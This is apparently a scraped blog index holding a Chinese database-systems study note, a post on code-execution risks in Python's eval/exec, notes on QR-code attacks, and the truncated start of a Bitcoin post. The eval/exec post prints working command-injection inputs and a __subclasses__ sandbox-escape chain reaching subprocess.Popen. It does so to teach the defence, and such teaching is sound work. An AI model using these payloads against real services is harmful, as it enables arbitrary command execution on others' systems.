定义：ΠF1,F2,...,Fn(E) ，E是任意关系代数表达式，Fi是涉及常量以及E的模式种属性的算术表达式 广义投影运算允许在投影列表中使用算术函数来对投影进行扩展 示例：给定关系 instructor(ID, name, dept_name, salary) 其中salary 是年薪， 可以得到每个教师的ID、name、dept_name及每月的工资： ΠID, name, dept_name, salary/12(instructor)  聚集函数   聚集函数：输入值的一个汇集，将单一值作为结果返回\n  avg：平均值 min：最小值 max：最大值 sum：求和 count：计数     示例：\n   聚集的结果没有名称  可以使用更名运算给他命名 为方便起见，我们允许把更名作为聚集运算的一部分    多重关系代数  纯关系代数删除所有的重复 多重集关系代数保存重复，为了匹配SQL的语义 多重集关系代数定义为：  选择：和输入关系中的满足选择条件的元组个数一样多 投影：每个输入元组产生一个元组，即使有重复也保留 叉积：如果关系 r 的元组 t1 有m个副本，关系s 的元组 t2 有 n**个副本，则关系r x s的元组t1.t2有m x n个副本 类似的，其他的操作为 示例：并：m + n个副本，交：min(m, n)个副本，差：min(0, m – n)个副本    具体可以见SQL的多重关系运算==\u003e #集合运算与重复\n元组关系演算   元组关系演算是非过程化的查询语言，查询表达式的形式为：{ t | P(t) }\n  表示它是所有使谓词P为真的元组 t 的集合\n  t 为元组变量，t[A] 表示元组 t 在属性A上的值\n  t ∈ r 表示元组 t 在关系 r 中\n  P是一个类似于谓词演算的公式，由原子公式和运算符组成\n 原子公式  s ∈ R：s是关系R中的一个元组 sθ u[y] ：s与u[y] 为元组分量，他们之间满足比较关系θ sθ c：分量s与常量c之间满足比较关系θ   公示的递归定义  原子公式是公式 如果P是公式，那么 ﹁P 和 (P) 也是公式 如果P1、P2是公式，则 P1 ∧ P2， P1 ∨ P2 ，P1 ⇒ P2也是公式 如果P(t) 是公式，R是关系， 则 ∃ t ∈ R (P(t)) 和 ∀ t ∈ R (P(t)) 也是公式     谓词演算公式：\n 属性和常量的集合 比较运算符的集合（\u003c，≤，=，≠，\u003e，≥） 连词的集合（and，or，not） 蕴含（⇒ ）： x ⇒ y，如果x为真，则y也为真。 x ⇒ y ≡ ﹁ x ∨ y 量词的集合：∃ 和 ∀     表达式的安全性  元组关系演算表达式可能产生一个无线的关系 为了避免产生无限关系，我们将限制所允许的表达式集合为安全表达式  元组关系演算与关系代数的等价性   投影：\tΠA(R) = { t | ∃s ∈ R，(t[A] = s[A]) }\n  选择： σF(A)(R) = { t | t ∈ R ∧ F(t[A]) }\n  广义笛卡尔积： R(A) × S(B) = { t | ∃u∈R, ∃s∈S ，( t[A] = u[A] ∪ t[B] = s[B])}\n  并： R ∪ S = { t | t ∈ R ∨ t ∈ S }\n  差： R - S = { t | t ∈ R ∧ ﹁ t ∈ S }\n  数据库设计与ER模型 设计模型概览 数据库设计  工程性 有基本的对错问题 不能简单的以对/错论述问题  不同的工程方法可以达到工程目的 对错概念被弱化   强调优劣好坏  好优的工程可以以较小代价，取得较好/高的成果   强调多数人的看法和评价  软件生命周期瀑布模型如下图\n需求分析的目标、内容和结果   需求分析的目标\n 澄清用户需求 为系统设计和实现奠定基础    需求分析的内容\n 数据分析：包括数据结构、关系、约束、语义等等 加工逻辑分析：对数据如何进行加工、处理、变换 流程分析：动作间的先后次序，以及相互关系 其他：界面要求、性能需求    需求分析的结果\n 用户需求规格说明书（简称需求说明书）    实体-联系模型 实体联系模型（Entity Relationship Diagram），简称ER图\n  ER图的位置  数据分析、描述的工具 数据分析、描述以E-R图为主 需要其他文档辅助    ER图的作用  帮助澄清用户数据需求，分析员和用户对数据需求达成高度一致 数据逻辑模型设计的基础    ER图的要求和评价标准  清晰、易懂 完整、精确、无二义    需要关注的主要缺陷  冗余 不完整    一个数据库可以建模成①一组实体集；②多个实体间的相互关联\n实体是现实世界中可区别于所有其他对象的一个“事务”或“对象”\n 实体具有属性  一个实体集是相同类型即具有相同性质（或属性）的一个实体集合\n联系集是相同类型联系的集合\n联系集是 n ≥ 2 个（可能相同的）实体集上的数学联系。如果E1，E2，...，En是实体集，那么联系集 R 是 { (e1,e2,...,en) | ei ∈ Ei }\n联系也可以具有描述性属性\n 例如，考虑实体集 instructor 和 student 之间的联系集 advisor 。 我们可以将属性 date 与该联系关联起来，以表示教师成为学生的导师的日期。\n 联系集的度 二元联系集：涉及两个实体集（或说度为2）；数据库系统中的大部分联系集都是二元的。\n属性 实体通过一组属性来表示，属性是实体集中每个成员所拥有的描述性性质\n域：每个属性都有一个可取值的集合\n 属性类型  简单（Simple） and 复合（Composite）属性 单值（Single-valued） and 多值（Multivalued）属性 派生（Derived）属性    如下图，address就是一个复合属性\n约束   映射基数  表示一个实体通过一个联系集能关联的实体的个数 在描述二元联系集时非常有用 对于实体集A和B之间的二元联系集R来说，映射基数必然是以下情况之一  一对一（One to one） 一对多（One to many） 多对一（Many to one） 多对多（Many to many）      参与 参与：Participation：实体集之间的关联称为参与，即实体参与联系\n码 实体集的超码是一个或多个属性的集合，这些属性的值可以是我们唯一地标识一个实体\n实体集的候选码是一个最小的超码\n虽然可能存在多个候选码，只有一个候选码能被选为主码\n==\u003e详细定义可见 码的定义\n联系集的码：参与实体集合的主键组合形成联系集的超码\n NOTE：这意味着一对实体在特定联系集中至多有一个关系  决定候选码的时候必须考虑联系集的映射基数\n在选择主键的时候要考虑联系集的语义信息以防有多个候选码\n冗余属性 # 例 假设我们拥有实体集 instructor (具有属性 dept_name), department 和一个关系inst_dept 联系 instructor 和 department 实体 instructor 中属性 dept_name 是冗余的，因为有明确的关系inst_dept 联系instructors 和 departments 属性dept_name 在两个实体集中都出现了，他在实体集 instructor 中是冗余的，需要将其移除。 BUT: when converting back to tables, in some cases the attribute gets reintroduced, as we will see. 实体-联系图  分成两部分的矩形代表实体集 菱形代表联系集 属性在实体集矩形中列出 构成主码的属性用下划线标明 若联系集拥有属性，则用虚线引出一个矩形，在矩形中标明属性  角色 一个关系的实体集必须是互异的，实体在联系中扮演的功能称为实体的角色\n如图，标签course_id和prereq_id被称作角色\n基数约束 我们在所讨论的联系集和实体集之间画一个箭头（→）或一条线段（—）来表示基数约束\n 一对一关系  如图，instructor 和 student 之间的一对一关系 通过 advisor一名教师至多指导一名学生 通过 advisor一名学生至多可以有一位导师。     一对多关系  instructor 和 student 之间的一对多关系 通过 advisor一名教师可以指导多名学生（包含0名） 通过 advisor一名学生至多可以有一位导师     多对一关系  instructor 和 student 的多对一关系 通过 advisor一名教师可以指导至多一名学生 通过 advisor一名学生可以有多名导师(包括0名)     多对多关系  通过 advisor一名教师可以指导多名学生 通过 advisor一名学生可以有多位导师     带有箭头的线表示只对应一个，没有箭头的线代表可以有多个对应  全部参与 全部参与（用双线表示）：实体集中的每个实体在联系集中至少参与了一个关系\n如图，每个section（部门）都必须有一个相关的课程\n基数限制的可选标记 上下界约束：A1，A2，…，An之间的多元联系，Ak端的基数约束L..H表示：对来自{A1,A2…,Ak-1,Ak+1,…,An}集合的每个实体组，至少和L个、至多和H个来自Ak的实体关联\n(该说法与教材相反)\n弱实体集  没有足够的属性以形成主码的实体集称作弱实体集 弱实体集存在依赖于标识实体集  标识性联系是从弱实体集到标识实体集多对一的，并且弱实体集在练习中的参与是全部的 标识性联系以双菱形表示   弱实体集的分辨符是使得我们可以区分依赖于特定强实体集的弱实体集中的实体的属性的集合 弱实体集的主码是有标识实体集的主码加上该弱实体集的分辨符构成的 弱实体集的分辨符以虚下划线标明，而不是实线 关联弱实体集和标识性强实体集的联系集以双菱形标识 示例如下，Section的主键（course_id，sec_id，semester，year）  转化为关系模式   根据ER模型建立数据库模式的步骤  ER图转换为表进行必要的合并   本步可以按照机械方法完成  一个良好的ER图，完成本步转换和合并得到的结果，已经是比较理想的数据库模式    优化  本步无具体可行的机械方法 主要依靠设计人员的经验和能力      在数据库设计中，对于每个实体集和每个联系集，都有唯一的关系模式与之对应\n  可以将一个符合ER数据库模式的数据库表示为一些关系模式的集合\n  关系模式名即为相应地实体集或联系集的名称\n  每个模式有几列（类似于属性），每列有唯一的名字\n  具有简单属性的实体集的表示  用具有n个不同属性的模式E来表示强实体集 用包含标识性强实体集的主键作为列构成的表来表示实体集   多对多联系集表示为两个参与实体集主键属性和联系集中任何描述属性所组成的模式  模式的冗余 多对一和一对多联系集中全部参与的many一方可以通过增加额外的属性来表示，包含one一方的主键\n 对于一对一联系集，任意一边都可以作为many一方  额外的属性可以加到类似于两个实体集的任一个表中   若many一方是部分参与，利用many一方生成额外属性会导致存在空值 连接弱实体集与其依赖的强实体集的联系集的模式是冗余的  复合多值属性  复合属性可以在划分为更小的部分（即其他属性） 实体E的多值属性M用一个单独的关系模式EM标识  关系模式EM有和E的主键相关的属性，有一个和多值属性M相关的属性   多值属性的每个值和关系模式EM中的每个分离的元组相匹配  模式优化  关系模式设计方案的评价标准  数据表示符合自然结构 清晰、简洁、易于理解 数据冗余小 数据访问效率高 结构易于扩展 。。。   关系模式的设计  设计方案的评价标准中，指标相互之间存在的矛盾 设计是在矛盾的指标中，评价选择最合适的方案 工程思想和方法、设计人员的经验和能力，对模式设计都是重要的   E-R图转换为表 vs 模式优化设计  一个良好的ER图，转换为表并进行必要的合并，得到的结果已经是比较理想的数据库模式 不排除还有人工进一步优化的余地 进一步的优化必须审慎，必须综合评价优化的优缺点    设计问题：用实体集还是属性集，用实体集还是联系集，二元还是n元联系集\n扩展的E-R特性   特化  自顶而下设计过程：实体集可能包含一些子集，子集中的实体在某些方面区别于实体集中的其他实体 这些子集变为低层次的实体集，拥有不适用于高层次实体集的属性或一些部分参与的关系 在E-R图中，特化用从特化实体指向另一个实体的空心箭头来表示，我们成这种关系为ISA关系 属性继承：高层实体集的属性你可以被底层实体集继承。底层实体集（或子类）同时还继承地参与其高层实体（或超类）所参与的实体集    概化  自底而上的设计过程：多个实体集根据共同的特征给你综合成一个较高层的实体集 概化只不过是特化的逆过程，在ER图中，我们对概化和特化的表示不做区分    特化关系还可以形成超类：子类联系\n  特化/概化上的约束   实体可以是给定低层次实体集成员的约束\n 条件定义的 用户定义的    另一类约束涉及在一个概化中另一个实体是否可以属于多个低层实体集\n 不相交（Disjoint）  不相交约束要求一个实体至多属于一个低层实体集 Noted：在ER图中，通过连接在同一个矩形上的多个低层次实体集表示   重叠（overlapping）  同一个实体可以同时属于同一个概化中的多个低层实体集      完整性约束：定义高层实体集中的另一个实体是否必须至少属于该概化/特化的一个低层实体集\n 全部概化：每个高层实体必须属于一个低层实体集 部分概化：允许一些高层实体不属于任何低层实体集    通过模式表示特化：\n Method1  为高层实体集创建一个模式 每个低层实体集创建一个模式，模式中的属性包括对应低层实体集的每个属性，以及对应于高层实体集主码的每个属性 DrawBack：与低层关系模式有关的关系和与高层关系模式有关的关系   Method2  利用低层实体集的每个属性和对应于高层实体集的每个熟悉创建模式 如果特化是完全的，不需要存储概化实体集的信息(可以定义为包含特化关系并集的view，可能仍然需要显示的定义外键约束) Drawback：可能会存在冗余      数据库设计的其他方面  数据约束  识别约束、描述约束、在模式实际中实现约束   性能考虑  吞吐量，响应时间的需求分析与相关设计考虑 索引设计：索引对查询和更新效率的影响   授权 工作流  流程分析和设计是应用系统开发的重要环节 工作流管理系统（WFMS）是流程管理的重要平台 WFMS是一个专业领域，本身并不属于数据库领域   其他：考虑将来可能的变迁  关系数据库设计 好的关系设计特点   RDB设计工程方法的代表：E-R图方法  绘制E-R图 E-R图 → RDB模式 模式优化    RDB设计工程方法的问题  E-R质量和分析员的能力水平相关 E-R质量难以保证，致使E-R方法设计质量难以保证 其他RDB模式工程设计方法存在类似的问题    质量保证  质量保证 vs 高质量 工程方法质量保证困难，受工程人员能力影响大 质量保证常用方法：机械化、形式化    关系模式规范化研究背景  为提高RDB设计质量保证，国外学者探寻和研究形式化的RDB设计方法 提出和完善了：关系模式规范化理论和方法 希望按照规范化理论和方法， 能够进行有质量保证的RDB设计    关系模式规范化的基本思路  泛关系：Universal Relation 数据间的约束 按照机械算法，得到好的关系模式    关系模式规范化理论和方法  模式规范化方法的研究状况  提出了模式规范化的标准：1NF，2NF，3NF，BCNF，4NF，5NF，6NF 给出了泛关系分解到具体范式的算法 算法多为NP算法，无法实际执行   规范化方法学习价值  理解不同范式的优缺点 理解相应的模式改进方法 作为重要指导思想指导模式设计    设计选择  更小的模式：连接不起来表——有损分解 更大的模式：信息重复  有损分解：分解范式之后，自然连接不能重构表\n无损分解：分解之后，自然连接能重构表\n 好的关系模式  该大则大，该小则小 同数据本质结构相吻合 不必存储不必要的重复信息，同时又可以方便地获取信息   如何得到好的关系模式  工程化方法 模式规范化    原子域和第一范式   原子域：域元素被认为是不可分的单元，称域是原子的。\n  第一范式：称一个关系模式R属于第一范式，如果R的所有属性域都是原子的。\n  非原子值是的存储变复杂并且导致数据存贮的冗余\n 决定一个特定关系R是不是一个好的形式\n若一个关系R不是好的形式，将他分解为一系列关系 {R1，R2，... ，Rn}，使得\n 每个关系是形式良好的 分解是无损的    基础理论：\n 函数依赖 多值依赖   函数依赖 函数依赖是在合法关系集合上的约束，要求一个特定的属性集合的值唯一决定另一个属性集合的值\n一个函数依赖是一个码标识的概化\n考虑一个关系模式R， α ∈ R and β ∈ R ，函数依赖 α → β 满足的条件是对实例中所有元组对t1和t2，有 t1[α] = t2[α] ⟹ t1[β] = t2[β] 。如果R的每个合法实例r都满足函数依赖 α → β ，则我们说该函数依赖在模式R上成立。\n 如果函数依赖 K → R 在R上成立，则K是R的一个超码。 K是R的候选码当且仅当 ① K → R；② 不存在 α ⊂ K，α → R。  函数依赖的使用   利用函数依赖\n 判断关系的实例是否满足给定函数依赖集F  如果一个关系实例r在函数依赖集F下是合法的，那么r满足F   说明合法关系集上的约束  如果R上的所有合法关系都满足函数依赖集F，那么F在R上成立   Note：即使一个函数依赖在所有实例上不成立，他可能在某个特定的关系模式实例上成立 例如，instructor上的一个特定实例，满足name → ID    有些函数依赖称为平凡的，因为他们在所有关系中满足：\n 一般的，如果 β ⊆ α ，α → β是平凡的    平凡的函数依赖\n 对所有的关系模式R，如果 β ⊆ α ，必有α → β 当 β ⊆ α 时，称 α → β 是平凡（trivial）的函数依赖 否则，称为 α → β 非平凡的函数依赖，称 α 是 β 的实质决定因素     对立关系模式R(sno, sname, dno, dname)，下述函数依赖成立：\n sno → sname，dno，dname sno，sname → dno dno → dname   函数依赖是对关系模式的约束\n 关系模式的表示：四元组 R（U，D，dom，F），F是R成立的函数依赖集合 关系模式简单表示为：R(F)  不成立的函数依赖  对关系模式R(sno, sname, dno, dname)，下述函数依赖不成立：sname → sno  函数依赖是对模式的约束 函数依赖必须是现实语义约束的反映 在一些具体的关系实例上，sname → sno成立    函数依赖与码  使用函数依赖码  超码SuperKey：对关系模式R， α ⊆ R，如果 α → R，则α为超码 候选码CandidateKey：对关系模式R，α为超码，如果任意α的真子集β，β → R 不成立，则称α 为候选码     例：对关系模式R(sno,sname,dno,dname)，下述函数依赖成立：①sno→R②sno,dno→R\n  实例满足的依赖 vs 模式上成立的依赖  关系模式R(F)，如果 r ∈ R(F)，则  R上成立的所有函数依赖，r必须满足；否则，称r ∉ R(F) r上满足的函数依赖，R上不一定成立      函数依赖集合的闭包 给定函数依赖集F，必定有一些其他的函数依赖被F逻辑蕴含，例如：如果A→B且B→C，那么可推断A→C\n能够从给定F集合推导出的所有函数依赖的集合称为F的闭包\n使用F+ 符号来表示F集合的闭包\nF+是F的一个超集\nBoyce-Codd 范式 具有函数依赖集F的关系模式R属于BCNF的条件是，对F+中所有形如 α → β 的函数依赖，下面至少有一项成立：\n α → β 是平凡的函数依赖（即 β ⊆ α） α 是模式R的一个超码   1NF是指数据库表的每一列都是不可分割的基本数据项，即实体中的某个属性不能有多个值或者不能有重复的属性。\n2NF要求属性完全依赖于主键，不能存在仅依赖主关键字一部分的属性。\n3NF要求每一个非主属性既不部分依赖于码也不传递依赖于码。\nBCNF消除了主属性对候选码的部分和传递函数依赖。\n1、第一范式（1NF）：一个关系模式R的所有属性都是不可分的基本数据项，原子的。\n2、第二范式（2NF）：满足第一范式，然后消除部分依赖。\n3、第三范式（3NF）： 满足第二范式，消除传递依赖。\n BCNF的本质  （在只考虑函数依赖的前提上）只讲一件事 非码决定的那个因素的相关决定关系讲述了另外一件事 多个码是一件事的不同方面，本质上仍是一件事  所有的二元联系都是BCNF\nBCNF和保持依赖：关系模式可以通过分解达到BCNF\nDBMS检查函数依赖的开销很大\n将数据库设计成能够高效的检查约束是很有用的，如果函数依赖的检验仅需要考虑一个关系就可以完成，那么检查这种约束的开销就很低\nBCNF的设计不是保持依赖的，由于常常希望保持依赖，因此考虑另外一种比BCNF弱的范式，它允许保持依赖，该范式称为第三范式\n第三范式 关系模式R属于第三范式（3NF）的条件：对于所有 α → β in F* ，以下至少一项成立：\n α → β 是一个平凡的函数依赖（β ∈ α ） α 是 R的一个超码 β - α 中的每个属性A都包含于R的一个候选码中（Note：每个属性A可能包含于不同的候选码中）  任何满足BCNF的模式也满足3NF（因为他的每个函数依赖都将满足前两个条件中的一条）\n在某种意义上，3NF的第三个条件代表BCNF条件最小放宽，以确保每一个模式都有保持依赖的3NF分解\n使用函数依赖进行分解 函数依赖理论 分解算法 使用多值依赖的分解 更多的范式 数据库设计过程 时态数据建模 数据存储和数据访问 查询处理和查询优化 事务管理 查询代价\n多值依赖\n冲突串行化\n211.87.227.230:3306\nwebteach\n","description":"","tags":["Database","studyNote"],"title":"Database-System","uri":"/posts/database-system/"},{"categories":[],"content":"Python中有潜在代码执行风险的函数  参考：\nPython中有潜在代码执行风险的函数(一)\n 在Python中一些函数存在着任意代码执行的隐患，错误的使用这些方法将会导致漏洞的产生，攻击者可能会利用这些安全隐患进行攻击。\n第一组 经典的两个存在执行代码隐患的函数 eval() 和 exec()\n在python中，eval和exec 的用法极其相似。eval和exec都可以将传入的字符串执行，但两者又有不同之处\neval eval是一个python内置函数，语法为eval(expression, globals=None,locals=None)\neval函数接收三个参数：其中\n  expression参数是用做运算的字符串类型表达式；\n  globals参数用于指定运行时的全局命名空间；\n  Locals参数用于指定运行时的局部命名空间。\n  globals与 locals 是可选参数，默认值是 None，他们只在运算时起作用，运算后则销毁。\nexec 在Python2中exec是一个内置语句(statement)而不是一个函数，但是到了Python3中exec将Python2中作为内置语句的exec和execfile()函数功能整合到一起，成为了一个新的函数，语法为exec(object[, globals[,locals]])\nexec的第一个参数可以是code object，因此它可以执行复杂的代码逻辑，例如变量赋值操作等，这一点是eval做不到的。但exec返回值永远为 None，因此exec不能像eval一样将计算结果返回。exec的后两个参数与eval一致。（所以eval通常可以当作是一个计算器，计算一串字符的值）\n对比：   在执行python语句上不同   exec()可以对变量a进行赋值，而eval()并不能对a进行赋值\nexec()可以执行python的import os，而eval()不能直接执行python语句，但是可以执行表达式'__import__(\"os\")'并返回结果\n __import__()函数用于动态加载类和函数，可以将该引入模块作为一个动态对象使用\n 相较于exec：\n  返回值不同   由图可见，eval在对表达式进行计算后，返回计算结果，而exec并无返回结果\n虽然有种种不同，但是还是会将第一个传入参数进行执行\n存在的安全隐患 以eval()函数为例，下图中的add函数使用eval()对传入参数进行处理，将传入的a，b拼接起来通过eval()计算返回结果\n1 2  def add(a, b): return eval(\"%s+ %s\" % (a, b))   通过eval进行执行表达式\n1 2 3  add(\"__import__('os').system('whoami')\", 2) eval(\"__import__('os').system('whoami')\") add(\"__import__('os').system('whoami') #\", 2)   成功执行命令，并返回结果2。\n返回结果0是因为os.system()执行成功的话，返回值为0。\n如同sql注入一样的思路，在执行语句后面加上注释，即可返回结果0。\n防范 通过上面可知，只要eval或exec中的传入变量可控，就存在执行系统命令的问题\n针对上面的例子eval(\"__import__('os').system('whoami')\")的问题，存在一种常见的限制方法：即指定eval()或exec()的globals参数为{'builtins':None}或者{'builtins':{}}这样的形式就可以避免任意代码执行的隐患。这种方法实际上是限制了他们可用的python内置模块(builtins)\n在eval()和exec() ，globals参数用于指定运行时的全局命名空间，如果globals没有被提供，则使用python的全局命名空间\n如上图，若不规定globals参数，则使用python全局的a=1，若提供了globals参数{'a':6}，则使用globals参数里的数据，即eval的作用域就是{'a':6}\n而且当eval使用了自己作用域里的参数，就不会使用python的全局命名空间\npython的builtins模块 builtins模块是提供对python的所有“内建”标识符的直接访问功能。python解释器在加载时会首先加载内建名称空间并自动导入所对应的内建函数，在执行python的时候加上-v的选择就可以看到加载过程。\n python源码分析——内建模块builtins初始化\n 而且由于builtins的存在，使得在Python可以直接使用一些内建函数而不用显式的导入它们，例如input()、list()、import 等\n通过命令dir(__builtins__)就可以看到所有的内建函数\n在python中使用上述函数都可以不用导入模块\n回到exec/eval问题中，值得注意的是，在exec/eval中，若globals参数被提供，但是没有提供自定义的builtins，那么exec/eval会将当前环境中的builtins拷贝至自己提供的globals里，例子如下图：\n如图，若globals里不规定__builtins__，则会使用python全局的builtins，例如in[25]。如果定义了builtins，则会使用已经定义的builtins，如in[27]和in[28]。\n 这里我没搞懂26为什么也可以，因为builtins在python3.x的时候已经和builtin合并了。\n后面实验时发现，builtins可以被当作模块所import，所以推测python初始化的时候使用的是__builtins__，实验证明这是正确的\n exec的globals策略与eval相同\n因此可以通过指定globals参数，来控制eval运行执行的内置函数。这个方法看起来很有效的限制eval/exec对import等内置函数的使用，似乎可以防止任意代码执行。但是此方法仍然存在绕过\n绕过 在上述防范中，通过globals参数对builtins中的内置函数范围进行限制，使得eval/exec无法随意使用”import”等内置函数来达成阻止任意代码执行\n但是却存在如下绕过：(1, 2).class.bases[0].subclasses\n如图，(1,2)是一个元组，__class__用于查看对象所在的类，很显然(1,2)是个元组类型的对象，即tuple类\n__bases__属性返回所有直接父类所组成的元组（直接父类是因为python的多继承属性所导致）\n如In[36]可见元组类型的直接父类是object类\n__subclasses__ 可用来获取类的所有子类，贼恐怖\n因为(1,2).__class__.__bases__[0]已经是object类了，而object类的子类众多，因此可以使用的类就非常丰富了\n比如list就在object类里，对应着(1,2).__class__.__bases__[0].__subclasses__()[7]\n这样就可以调用list函数，将其转为一个list\n构造利用链的核心方法就是：只要追溯到object类并使用subclasses()使用object子类即可\n在object子类中，有执行系统命令的子类 subprocess.Popen\n subprocess 模块允许你生成新的进程，连接它们的输入、输出、错误管道，并且获取它们的返回码。\nsubprocess.Popen(args, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE,stdout=subprocess.PIPE)\n args 被用作启动进程的参数. 可能是一个列表或字符串. shell （默认为 False）指定是否使用 shell 执行程序。如果 shell 为 True，更推荐将 args 作为字符串传递而非序列。 stdout 从子进程捕获到的标准输出. 一个字节序列, 或一个字符串, 如果 run() 是设置了 encoding, errors 或者 text=True 来运行的. 如果未有捕获, 则为 None. 如果你通过 stderr=subprocess.STDOUT 运行, 标准输入和标准错误将被组合在一起, 并且 stderr` 将为 None. stderr 捕获到的子进程的标准错误. 一个字节序列, 或者一个字符串, 如果 run() 是设置了参数 encoding, errors 或者 text=True 运行的. 如果未有捕获, 则为 None.  简而言之 上面代码简而言之就是，接受args的命令，执行成功就将执行成功的结果存入stdout管道，执行失败的结果存入stderr管道。\n 显然，利用链：().__class__.bases[0].__subclasses__()[176](\"whoami\")\n可能由于我的引入库不同，导致了subclasses的列表选择不同，我在subclasses[217]找到subprocess.Popen，然后成功执行whoami命令\n每个python的运行环境不同，引入库的顺序不同，导致subprocess不一定在176位，甚至可能没有被引入\n由图可见，虽然可能没被引入，但是这种方法能成功绕过。可见，虽然限制只允许使用list，但是我们仍然可以执行系统命令。因此，简单的使用{'builtins': None}是无法满足eval的安全需求的\n实际上，可以使用ast.literal_eval()来代替eval()\nast.literal_eval()允许传入的内容如下\nstrings, bytes, numbers, tuples, lists, dicts, sets, booleans, None\n当不合法的字符传入时，程序则会报错，如下图\n使用ast.literal_eval()代替eval和exec，可以有效的防止任意代码执行漏洞\n甚至只要有任何不合法的字符传入，程序就会报错\n使用ast.literal_eval()代替eval和exec，可以有效的防止任意代码执行漏洞\n 扩展：\npython沙箱逃逸\n ","description":"","tags":[],"title":"Functions with potential code execution risks in Python","uri":"/posts/functions-with-potential-code-execution-risks-in-python/"},{"categories":[],"content":"关于python的QRCode的用法 qrcode的用法\n https://blog.csdn.net/cungudafa/article/details/85871871\n 利用zxing模块读二维码数据\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34  from PIL import Image import qrcode import os import zxing def make_qrcode(data): img = qrcode.make(data) img.sava(\"test.png\") im = Image.open(\"test.png\") im.show() def read_qrcode_zxing(filename): ''' logger = logging.getLogger(__name__) if not logger.handlers: logging.basicConfig(level=logging.INFO) DEBUG = (logging.getLevelName(logger.getEffectiveLevel()) == 'DEBUG') ''' img = Image.open(filename) ran = int(random.random() * 100000) img.save('%s%s.jpg' % (os.path.basename(filename).split('.')[0], ran)) zx = zxing.BarCodeReader()#调用zxing二维码读取包 data = '' zxdata = zx.decode('%s%s.jpg' % (os.path.basename(filename).split('.')[0], ran))#图片解码 # 删除临时文件 os.remove('%s%s.jpg' % (os.path.basename(filename).split('.')[0], ran)) if zxdata: logger.debug(u'zxing识别二维码:%s,内容: %s' % (filename, zxdata)) data = zxdata else: logger.error(u'识别zxing二维码出错:%s' % (filename)) img.save('%s-zxing.jpg' % filename) return data   但是，这只能识别标准的二维码，并不能识别图片中的二维码，由于这里需要用到tesseract，因此直接用二维码软件进行扫（注意不能用微信支付宝之类的，因为碰到url此类软件会直接跳转，好像QQ和一些第三方的扫码软件不会直接跳转url，而是显示其数据）\n乌云的二维码攻击  QR二维码的攻击方法与防御\n  网络钓鱼 诱导下载、传播恶意软件 隐私泄露  防御方式  QR码解码译码过程加入加解密环节 第三方统一管理  思考 1.加入加解密环节：这只是确保了原二维码的数据的完整性，隐匿性，并不能确保其不被中间人攻击，即直接替换二维码的行为\n现有共享单车扫码探索 Mobike: 8650262688:\thttp://www.mobike.com/download/app.html?b=8650262688_1 8641170177:\thttp://www.mobike.com/download/app.html?b=8641170177_1 8641176319: http://www.mobike.com/download/app.html?b=8641176319_1 hello bike: 3110469617: http://c3x.me/?n=3110469617 3110457021: http://c3x.me/?n=3110457021 5610663692:\thttp://c3x.me/?n=5610663692 didi bike: https://dc.tt/htw?id=1B24C1D\u0026p=2 https://dc.tt/htw?id=1B4910D\u0026p=2 用电脑直接访问该网址\n  Mobike是直接跳转到app推荐页面，打开下载，是腾讯合作方的应用宝下载\n  hello bike也是直接跳转至app推荐页面，打开下载，属于hellobike自己搭建的下载页面\n  滴滴是跳转到小程序推荐页面，\n  hello 由图可见，明显的一个env变量，推测是用来判断用的。\n然后下面就是对enc进行逻辑判断，然后处理跳转\n我的浏览器是跳转到了http://c3x.me/bike.html?n=3110469617\nhttps://c3x.me/wechat-ebike.html?n=3110469617是对微信内置浏览器做的一些页面自适应\n再次应该是对User-Agent进行判断，并跳转至相应页面，代码如下：\n // 基本环境及参数 var ua = window.navigator.userAgent; var params = {}; if (location.search) { var parts = location.search.substring(1).split('\u0026');  关于window.navigator.userAgent：https://blog.csdn.net/liangyihe/article/details/78464656\n 以下是苹果的useragent，用去替换\nUserAgent:Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1 果然是同一个页面的不同适应性处理\n对于aliBrowser，是对应跳转到相应的下载界面，采用alipays://plat....\n对于哈喽bike App也是跳转到自身的路由，然后再其服务端做处理\nMobike 抓包访问，发现是直接301了（永久性转移），然后没找到解决办法\n因为是直接跳转至下载界面，所有没有和此单车合作的app都是跳转至下载界面，抓包失败\ndidi this.config 0 {…} __method__: \"POST\" _source: \"https://page.xiaojukeji.com/m/hellopage.html?id=1B24C1D\u0026p=2\" api_version: \"1.0.1\" app_version: \"1.8.7\" appid: 30004 auto_fill_phone: true canonical_country_code: \"CN\" checkPhone: true city_id: 0 country_calling_code: \"+86\" country_filter: Array [] country_id: 156 from: \"webapp\" imei: \"\" lang: \"zh-CN\" law_checked: false origin_id: \"1\" role: 1 scene: 3 showCodeSign: false styleObj: Object { } useOauthCode: false \u003cprototype\u003e: Object { … } login.min.js:1:36888 明显的一个post请求，而且采用了https，不好抓包\n但是预测是跳转至小程序，属于微信小程序的。\n 手机抓包工具：fiddler，frida\n 通过以上可发现，共享单车的二维码大多都是通过二维码的url格式存储，然后通过url访问判断其user-Agent推测出使用的浏览器，然后做不同的路由处理或使用自身协议，如alipays://\n关于密码学与二维码的思考 在二维码多存入证书，存储的数据量应该会变大，但是不至于存不下，但是这是没有必要的。\n当扫完二维码访问其指向的url时，该请求已向ocsp请求在线证书了；而且该种方法也无法避免中间人攻击。（参考https的ssl中间人攻击）\n https中的ssl中间人攻击\n通过伪造CA证书，实现SSL中间人攻击\nSSL,TLS中间人攻击\nHTTPS中间人攻击实践（原理·实践）\n 至于二维码替换更加无可避免，因此还是采用信任可信第三方的(官方app，以及有合作的app)方法比较安全。（因为其用的是路由判断，不存在假的url能跳转）\n其次，假如在二维码中加入hash判断，也是不可行的。因为密码学不能依赖于不公开的算法，而且可以通过暴力匹配算出hash算法的流程。因此得知流程，将假url和假url的hash一起替换原url以及其hash便可产生攻击。\n","description":"Something about QRCode.","tags":["QRCode"],"title":"QRCodeAttack","uri":"/posts/qrcodeattack/"},{"categories":["crypto"],"content":"Bitcoin 数字货币和纸质货币的对比    属性 分析 优势方     便携 大部分场景（特别是较大数额支付时）下数字货币将具备更好的便携性 数字货币   防伪 两者各有千秋，但数字货币整体上会略胜一筹。 纸币依靠的是各种设计（纸张、油墨 、防伪 暗纹 、 夹层等）上的精巧，数字货币依靠的则是密码学上的保障。 事实上，纸币的伪造时有发生，但数字货币的伪造目前还无法实现 数字货币   辨伪 纸币即使依托验钞机等专用设备仍会有误判情况，数字货币依靠密码学易于校验 数字货币   匿名 